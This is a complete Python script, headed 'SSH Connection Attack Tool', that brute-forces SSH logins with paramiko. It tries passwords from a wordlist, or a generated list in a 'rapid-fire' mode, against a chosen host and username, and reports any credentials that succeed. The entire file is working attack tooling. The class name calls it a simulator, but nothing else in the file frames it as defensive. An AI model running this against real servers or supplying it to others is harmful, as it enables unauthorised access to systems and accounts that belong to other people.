#!/usr/bin/env python3
"""
SSH Connection Attack Tool
"""

import paramiko
import sys
import argparse
import time
from datetime import datetime

class SSHBruteForceSimulator:
    def __init__(self, host, port=22, username='admin', timeout=5):
        self.host = host
        self.port = port
        self.username = username
        self.timeout = timeout
        self.successful_logins = []
        self.failed_attempts = 0
        self.total_attempts = 0
        
    def attempt_login(self, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {self.username}:{password}")
            
            client.connect(
                self.host,
                port=self.port,
                username=self.username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                auth_timeout=self.timeout
            )
            
            print(f"[+] {self.username}:{password}")
            self.successful_logins.append((self.username, password))
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            self.failed_attempts += 1
            return False
        except paramiko.SSHException:
            return False
        except Exception:
            return False
        
        finally:
            self.total_attempts += 1
    
    def run_wordlist_attack(self, wordlist_file, delay_between_attempts=1):
        try:
            with open(wordlist_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Error: {wordlist_file} not found")
            sys.exit(1)
        
        print(f"\n[*] Target: {self.host}:{self.port}")
        
        start_time = time.time()
        
        for i, password in enumerate(passwords, 1):
            if self.attempt_login(password):
                elapsed = time.time() - start_time
                print(f"[+] Success after {i} attempts in {elapsed:.2f}s")
                break
            time.sleep(delay_between_attempts)
            if i % 10 == 0:
                print(f"[*] {i}/{len(passwords)}")
        
        elapsed = time.time() - start_time
        self.print_summary(elapsed)
    
    def rapid_fire_attack(self, password_list, attempts_per_second=5):
        print(f"\n[*] Target: {self.host}:{self.port}")
        
        start_time = time.time()
        delay = 1.0 / attempts_per_second
        
        for i, password in enumerate(password_list, 1):
            if self.attempt_login(password):
                elapsed = time.time() - start_time
                print(f"\n[+] Attack successful after {i} attempts in {elapsed:.2f} seconds!")
                break
            
            time.sleep(delay)
        
        elapsed = time.time() - start_time
        self.print_summary(elapsed)
    
    def print_summary(self, elapsed_time):
        print(f"\nAttempts: {self.total_attempts}")
        print(f"Duration: {elapsed_time:.2f}s")
        print(f"Rate: {self.total_attempts/elapsed_time:.2f}/s")
        if self.successful_logins:
            print("Found:")
            for user, pwd in self.successful_logins:
                print(f"  {user}:{pwd}")


def main():
    parser = argparse.ArgumentParser(description='SSH Connection Tool')
    
    parser.add_argument('--host', required=True, help='Target SSH host IP address')
    parser.add_argument('--port', type=int, default=22, help='Target SSH port (default: 22)')
    parser.add_argument('--user', default='admin', help='Username to attack (default: admin)')
    parser.add_argument('--wordlist', help='Password wordlist file')
    parser.add_argument('--delay', type=float, default=1, help='Delay between attempts in seconds (default: 1)')
    parser.add_argument('--rapid', action='store_true', help='Use rapid-fire mode')
    parser.add_argument('--attempts', type=int, default=5, help='Attempts per second in rapid mode (default: 5)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.wordlist and not args.rapid:
        print("Error: Must specify either --wordlist or --rapid")
        parser.print_help()
        sys.exit(1)
    
    # Create simulator
    simulator = SSHBruteForceSimulator(
        host=args.host,
        port=args.port,
        username=args.user,
        timeout=args.timeout
    )
    
    # Run attack
    if args.rapid:
        # Generate simple password list for rapid attack
        passwords = [f"password{i}" for i in range(args.attempts * 10)]
        simulator.rapid_fire_attack(passwords, attempts_per_second=args.attempts)
    else:
        simulator.run_wordlist_attack(args.wordlist, delay_between_attempts=args.delay)


if __name__ == '__main__':
    main()
